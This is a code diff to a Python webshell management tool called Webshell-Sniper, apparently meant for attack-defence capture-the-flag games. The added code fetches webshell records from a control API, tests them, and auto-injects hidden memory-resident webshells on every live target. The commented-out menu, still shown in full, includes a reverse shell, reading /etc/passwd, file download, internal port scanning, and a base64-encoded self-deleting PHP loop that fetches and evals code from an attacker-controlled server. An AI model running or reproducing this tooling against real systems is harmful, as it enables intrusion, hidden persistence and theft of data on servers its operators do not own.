@@ -9,6 +9,7 @@ from core.banner import banner
 from core.utils.network import get_ip_address
 from core.utils.string_utils.random_string import random_string
 
+import ConfigParser
 import sys
 import string
 import os
@@ -17,10 +18,14 @@ import readline
 import code
 import json
 import atexit
+import requests
 import time
 import signal
 
 salt = "Webshell-Sniper"
+config = ConfigParser.ConfigParser()
+config.read('../config.ini')
+
 
 def md5(content):
     return hashlib.md5(content).hexdigest()
@@ -78,11 +83,98 @@ def signal_handler(ignum, frame):
     print ""
     Log.info("Enter : 'q|quit|exit' to shutdown the program!")
 
+def update_webshell_alive(webshell_id, alive, reason):
+    url = "http://%s:%d/api/%s/%d/" % (
+        config.get("sirius", "host"),
+        int(config.get("sirius", "port")),
+        "webshell",
+        int(webshell_id),
+    )
+    data = {
+        "alive":alive,
+        "reason":reason,
+    }
+    response = requests.patch(url, headers={
+        'Authorization': 'Bearer %s' % (config.get("sirius", "token")),
+    }, data=data)
+
+def query(model, challenge_name=""):
+    if challenge_name != "":
+        url = "http://%s:%d/api/%s/?challenge=%s" % (
+            config.get("sirius", "host"),
+            int(config.get("sirius", "port")),
+            model,
+            challenge_name,
+        )
+    else:
+        url = "http://%s:%d/api/%s/" % (
+            config.get("sirius", "host"),
+            int(config.get("sirius", "port")),
+            model
+        )
+    content = requests.get(url, headers={
+        'Authorization': 'Bearer %s' % (config.get("sirius", "token")),
+    }).content
+    return json.loads(content)
+
+def get_targets(target_url):
+    response = requests.get(target_url, headers={
+        'Authorization': 'Bearer %s' % (config.get("sirius", "token")),
+    })
+    return json.loads(response.content)
+
+def get_webshells_config():
+    webshells = query("webshell")
+    result = []
+    for webshell in webshells:
+        target = get_targets(webshell["target"])
+        url = "http://%s:%d%s/%s" % (
+            target["host"],
+            target["port"],
+            webshell["path"],
+            webshell["filename"],
+        )
+        password = webshell["password"]
+        result.append({
+            "id":webshell["id"],
+            "url":url,
+            "password":password,
+            "method":"POST",
+            "target_url":str(webshell["target"]),
+        })
+    return result
+
+def create_webshell(target_url, path, filename, password, memory=False):
+    url = "http://%s:%d/api/%s/" % (
+        config.get("sirius", "host"),
+        int(config.get("sirius", "port")),
+        "webshell",
+    )
+
+    data = {
+        "alive":True,
+        "target":target_url,
+        "path":path,
+        "filename":filename,
+        "password":password,
+        "memory":memory,
+    }
+    print data
+    # print data
+    response = requests.post(url, headers={
+        'Authorization': 'Bearer %s' % (config.get("sirius", "token")),
+    }, data=data)
+    content = response.content
+    print content
+    webshell_id = json.loads(content)['id']
+    return webshell_id, response.status_code
+
 def main():
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
+
     default_filename = "webshells"
-    banner()
+    # banner()
     webshells = []
     if len(sys.argv) == 2:
         filename = sys.argv[1]
@@ -104,9 +196,6 @@ def main():
             else:
                 Log.error("This webshell can not work...")
         Log.info("Loading file finished!")
-        if len(webshells) == 0:
-            Log.error("No webshell works well, exiting...")
-            exit(2)
         Log.info("%d webshells alive!" % (len(webshells)))
         Log.info("Entering interactive mode...")
     elif len(sys.argv) == 4:
@@ -120,174 +209,216 @@ def main():
         else:
             Log.error("This webshell can not work...")
             exit(3)
+    elif len(sys.argv) == 1:
+        # Get all webshell
+        webshells_config = get_webshells_config()
+        print webshells_config
+        for webshell_config in webshells_config:
+            print(webshell_config)
+            webshell = WebShell(webshell_config['url'], webshell_config['method'], webshell_config['password'])
+            webshell.set_target_url(webshell_config["target_url"])
+            # Update webshell status
+            update_webshell_alive(webshell_config["id"], webshell.working, webshell.reason)
+            if webshell.working:
+                Log.success("This webshell works well, adding into online list...")
+                # SAME_FLAG = False
+                # for online_webshell in webshells:
+                #     if online_webshell.url == webshell.url:
+                #         Log.warning("Same webshell detected! Skipping...")
+                #         SAME_FLAG = True
+                #         break
+                # if SAME_FLAG:
+                #     continue
+                webshells.append(webshell)
+            else:
+                Log.error("This webshell can not work...")
+
     else:
         show_help()
         exit(1)
 
-    LOCAL_COMMAND_FLAG = True
-    main_help()
+    if len(webshells) == 0:
+        Log.error("No webshell works well, exiting...")
+        exit(2)
+    # for target in targets:
+    for webshell in webshells:
+        # shells = webshell.auto_inject_random_phpfile()
+        filename = ".%s.php" % (random_string(0x10, string.letters + string.digits))
+        password = random_string(0x10, string.letters + string.digits)
+        shells = webshell.auto_inject_memery_webshell(filename, password)
+        for shell in shells:
+            create_webshell(
+                shell["target_url"], 
+                shell["path"], 
+                filename, 
+                password,
+                memory=True,
+            )
 
-    while True:
-        Log.context("sniper")
-        context_fresh = raw_input("=>") or "h"
-        context = string.lower(context_fresh)
-        if context == "h" or context == "help" or context == "?":
-            main_help()
-        #elif context == "sh" or context == "shell":
-        #    shell = Shell(webshell)
-        #    shell.interactive()
-        elif context == "rsh" or context == "rshell":
-            Log.info("socat file:`tty`,raw,echo=0 tcp-l:8888")
-            ip = raw_input("[IP] : (%s)" % (get_ip_address())) or get_ip_address()
-            port = raw_input("[PORT] : (8888)") or "8888"
-            Log.info("Starting reverse shell (%s:%s)" % (ip, port))
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.reverse_shell(ip, port)
-        elif context == "p" or context == "print":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.print_info()
-        elif context == "pv" or context == "php_version":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                Log.success(webshell.get_php_version())
-        elif context == "kv" or context == "kernel_version":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                Log.success(webshell.get_kernel_version())
-        elif context == "c" or context == "config":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                Log.info("Detacting config files...")
-                webshell.get_config_file()
-        elif context == "fwd":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.get_writable_directory()
-        elif context == "gdf":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.get_disabled_functions()
-        elif context == "fwpf":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.get_writable_php_file()
-        elif context == "fsb":
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.get_suid_binaries()
-        elif context == "setr":
-            LOCAL_COMMAND_FLAG = False
-        elif context == "setl":
-            LOCAL_COMMAND_FLAG = True
-        elif context == "dla":
-            path = raw_input("Input path (%s) : " % webshell.webroot) or (webshell.webroot)
-            args = raw_input("Please custom find args (%s) : " % (" -size 500k")) or " -size 500k"
-            Log.info("Using command : find %s %s" % (path, args))
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.download_advanced(path, args)
-        elif context == "dl":
-            path = raw_input("Input path (%s) : " % webshell.webroot) or (webshell.webroot)
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                if not webshell.file_exists(path):
-                    Log.error("The file [%s] is not exists on the server!" % (path))
-                    continue
-                if webshell.is_directory(path):
-                    Log.info("The target file is a directory, using recursion download...")
-                    filename_filter = raw_input("Input --name '%s' : " % ("*.php")) or "*.php"
-                    webshell.download_recursion(path, filename_filter)
-                else:
-                    #filename = path.split("/")[-1]
-                    #local_path = raw_input("Input local path (%s) to save the file : " % filename) or (filename)
-                    # Log.info("Using root path : [%s] to save!" % (local_path))
-                    Log.info("The target file is a single file, starting download...")
-                    webshell.download(path, path)
-        elif context == "ps":
-            hosts = raw_input("Input hosts (192.168.1.1/24) : ") or "192.168.1.1/24"
-            if not "/" in hosts:
-                Log.error("Please use the format IP/MASK , if want to scan a single host , set MASK=32")
-                continue
-            ports = raw_input("Input ports (21,22,25,80,443,445,3389)") or "21,22,25,80,443,445,3389"
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.port_scan(hosts, ports)
-        elif context == "aiw":
-            default_filename = random_string(0x10, string.letters)
-            default_password = md5(md5("%s%s%s" % (salt, default_filename, salt)))
-            filename = raw_input("Filename (.%s.php): " % (default_filename)) or (".%s.php" % (default_filename))
-            password = raw_input("Password (%s): " % (default_password)) or ("%s" % (default_password))
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.auto_inject_webshell(filename, password)
-        elif context == "aimw":
-            default_filename = random_string(0x10, string.letters)
-            default_password = md5(md5("%s%s%s" % (salt, default_filename, salt)))
-            filename = raw_input("Filename (.%s.php): " % (default_filename)) or (".%s.php" % (default_filename))
-            password = raw_input("Password (%s): " % (default_password)) or ("%s" % (default_password))
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.auto_inject_memery_webshell(filename, password)
-        elif context == "fr":
-            Log.info("Starting flag reaper...")
-            webserver_host = raw_input("[IP] (%s) : " % (get_ip_address())) or get_ip_address()
-            webserver_port = int(raw_input("[PORT] (80) : ") or "80")
-            filename = ".%s.php" % (random_string(0x10, string.letters))
-            file_content = "ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);while(true){$code = file_get_contents('http://%s:%d/code.txt');eval($code);sleep(5);}" % (webserver_host, webserver_port)
-            Log.info("Temp memory phpfile : %s" % (file_content))
-            Log.info("Encoding phpfile...")
-            file_content = '<?php unlink(__FILE__);eval(base64_decode("%s"));?>' % (file_content.encode("base64").replace("\n", ""))
-            Log.info("Final memory phpfile : %s" % (file_content))
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                result = webshell.auto_inject_flag_reaper(filename, file_content)
-                if result:
-                    Log.success("Please check the web server(%s:%d) log to get your flag!" % (webserver_host, webserver_port))
-                    Log.info("Tips : tail -f /var/log/apache2/access.log")
-                else:
-                    Log.error("Starting flag reaper failed!")
-        elif context == "r" or context == "read":
-            filepath = raw_input("Input file path (/etc/passwd) : ") or "/etc/passwd"
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                webshell.read_file(filepath)
-        elif context == "db" or context == "database":
-            ip = raw_input("IP (127.0.0.1): ") or "127.0.0.1"
-            username = raw_input("Username (root): ") or "root"
-            password = raw_input("Password (root): ") or "root"
-            Log.info("Creating connection by [%s:%s] to [%s]..." % (username, password, ip))
-            for webshell in webshells:
-                Log.info(str(webshell.info))
-                mysql_connection = Mysql(webshell, ip, username, password)
-                if not mysql_connection.function:
-                    Log.error("The target server cannot support mysql!")
-                    continue
-                if not mysql_connection.connection_flag:
-                    Log.error("Connection failed!")
-                    continue
-                Log.success("Connection success!")
-                if mysql_connection.function != "":
-                    Log.success("Entering database server interactive mode...")
-                    mysql_connection.interactive()
-                else:
-                    Log.error("No supported database function!")
-        elif context == "q" or context == "quit" or context == "exit":
-            Log.info("recording this webshell to the log file...")
-            save_webshells(webshells, "%s_%d.json" % (default_filename, time.time()))
-            Log.info("Quiting...")
-            break
-        else:
-            Log.error("Unsupported function!")
-            if LOCAL_COMMAND_FLAG == True:
-                Log.info("Executing command on localhost...")
-                os.system(context_fresh)
-            else:
-                Log.info("Executing command on target server...")
-                for webshell in webshells:
-                    Log.info(str(webshell.info))
-                    webshell.auto_exec_print(context_fresh)
+    # LOCAL_COMMAND_FLAG = True
+    # main_help()
+
+    # while True:
+    #     Log.context("sniper")
+    #     context_fresh = raw_input("=>") or "h"
+    #     context = string.lower(context_fresh)
+    #     if context == "h" or context == "help" or context == "?":
+    #         main_help()
+    #     #elif context == "sh" or context == "shell":
+    #     #    shell = Shell(webshell)
+    #     #    shell.interactive()
+    #     elif context == "rsh" or context == "rshell":
+    #         Log.info("socat file:`tty`,raw,echo=0 tcp-l:8888")
+    #         ip = raw_input("[IP] : (%s)" % (get_ip_address())) or get_ip_address()
+    #         port = raw_input("[PORT] : (8888)") or "8888"
+    #         Log.info("Starting reverse shell (%s:%s)" % (ip, port))
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.reverse_shell(ip, port)
+    #     elif context == "p" or context == "print":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.print_info()
+    #     elif context == "pv" or context == "php_version":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             Log.success(webshell.get_php_version())
+    #     elif context == "kv" or context == "kernel_version":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             Log.success(webshell.get_kernel_version())
+    #     elif context == "c" or context == "config":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             Log.info("Detacting config files...")
+    #             webshell.get_config_file()
+    #     elif context == "fwd":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.get_writable_directory()
+    #     elif context == "gdf":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.get_disabled_functions()
+    #     elif context == "fwpf":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.get_writable_php_file()
+    #     elif context == "fsb":
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.get_suid_binaries()
+    #     elif context == "setr":
+    #         LOCAL_COMMAND_FLAG = False
+    #     elif context == "setl":
+    #         LOCAL_COMMAND_FLAG = True
+    #     elif context == "dla":
+    #         path = raw_input("Input path (%s) : " % webshell.webroot) or (webshell.webroot)
+    #         args = raw_input("Please custom find args (%s) : " % (" -size 500k")) or " -size 500k"
+    #         Log.info("Using command : find %s %s" % (path, args))
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.download_advanced(path, args)
+    #     elif context == "dl":
+    #         path = raw_input("Input path (%s) : " % webshell.webroot) or (webshell.webroot)
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             if not webshell.file_exists(path):
+    #                 Log.error("The file [%s] is not exists on the server!" % (path))
+    #                 continue
+    #             if webshell.is_directory(path):
+    #                 Log.info("The target file is a directory, using recursion download...")
+    #                 filename_filter = raw_input("Input --name '%s' : " % ("*.php")) or "*.php"
+    #                 webshell.download_recursion(path, filename_filter)
+    #             else:
+    #                 #filename = path.split("/")[-1]
+    #                 #local_path = raw_input("Input local path (%s) to save the file : " % filename) or (filename)
+    #                 # Log.info("Using root path : [%s] to save!" % (local_path))
+    #                 Log.info("The target file is a single file, starting download...")
+    #                 webshell.download(path, path)
+    #     elif context == "ps":
+    #         hosts = raw_input("Input hosts (192.168.1.1/24) : ") or "192.168.1.1/24"
+    #         if not "/" in hosts:
+    #             Log.error("Please use the format IP/MASK , if want to scan a single host , set MASK=32")
+    #             continue
+    #         ports = raw_input("Input ports (21,22,25,80,443,445,3389)") or "21,22,25,80,443,445,3389"
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.port_scan(hosts, ports)
+    #     elif context == "aiw":
+    #         default_filename = random_string(0x10, string.letters)
+    #         default_password = md5(md5("%s%s%s" % (salt, default_filename, salt)))
+    #         filename = raw_input("Filename (.%s.php): " % (default_filename)) or (".%s.php" % (default_filename))
+    #         password = raw_input("Password (%s): " % (default_password)) or ("%s" % (default_password))
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.auto_inject_webshell(filename, password)
+    #     elif context == "aimw":
+    #         default_filename = random_string(0x10, string.letters)
+    #         default_password = md5(md5("%s%s%s" % (salt, default_filename, salt)))
+    #         filename = raw_input("Filename (.%s.php): " % (default_filename)) or (".%s.php" % (default_filename))
+    #         password = raw_input("Password (%s): " % (default_password)) or ("%s" % (default_password))
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.auto_inject_memery_webshell(filename, password)
+    #     elif context == "fr":
+    #         Log.info("Starting flag reaper...")
+    #         webserver_host = raw_input("[IP] (%s) : " % (get_ip_address())) or get_ip_address()
+    #         webserver_port = int(raw_input("[PORT] (80) : ") or "80")
+    #         filename = ".%s.php" % (random_string(0x10, string.letters))
+    #         file_content = "ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);while(true){$code = file_get_contents('http://%s:%d/code.txt');eval($code);sleep(5);}" % (webserver_host, webserver_port)
+    #         Log.info("Temp memory phpfile : %s" % (file_content))
+    #         Log.info("Encoding phpfile...")
+    #         file_content = '<?php unlink(__FILE__);eval(base64_decode("%s"));?>' % (file_content.encode("base64").replace("\n", ""))
+    #         Log.info("Final memory phpfile : %s" % (file_content))
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             result = webshell.auto_inject_flag_reaper(filename, file_content)
+    #             if result:
+    #                 Log.success("Please check the web server(%s:%d) log to get your flag!" % (webserver_host, webserver_port))
+    #                 Log.info("Tips : tail -f /var/log/apache2/access.log")
+    #             else:
+    #                 Log.error("Starting flag reaper failed!")
+    #     elif context == "r" or context == "read":
+    #         filepath = raw_input("Input file path (/etc/passwd) : ") or "/etc/passwd"
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             webshell.read_file(filepath)
+    #     elif context == "db" or context == "database":
+    #         ip = raw_input("IP (127.0.0.1): ") or "127.0.0.1"
+    #         username = raw_input("Username (root): ") or "root"
+    #         password = raw_input("Password (root): ") or "root"
+    #         Log.info("Creating connection by [%s:%s] to [%s]..." % (username, password, ip))
+    #         for webshell in webshells:
+    #             Log.info(str(webshell.info))
+    #             mysql_connection = Mysql(webshell, ip, username, password)
+    #             if not mysql_connection.function:
+    #                 Log.error("The target server cannot support mysql!")
+    #                 continue
+    #             if not mysql_connection.connection_flag:
+    #                 Log.error("Connection failed!")
+    #                 continue
+    #             Log.success("Connection success!")
+    #             if mysql_connection.function != "":
+    #                 Log.success("Entering database server interactive mode...")
+    #                 mysql_connection.interactive()
+    #             else:
+    #                 Log.error("No supported database function!")
+    #     elif context == "q" or context == "quit" or context == "exit":
+    #         Log.info("recording this webshell to the log file...")
+    #         save_webshells(webshells, "%s_%d.json" % (default_filename, time.time()))
+    #         Log.info("Quiting...")
+    #         break
+    #     else:
+    #         Log.error("Unsupported function!")
+    #         if LOCAL_COMMAND_FLAG == True:
+    #             Log.info("Executing command on localhost...")
+    #             os.system(context_fresh)
+    #         else:
+    #             Log.info("Executing command on target server...")
+    #             for webshell in webshells:
+    #                 Log.info(str(webshell.info))
+    #                 webshell.auto_exec_print(context_fresh)
 
 if __name__ == "__main__":
     main()
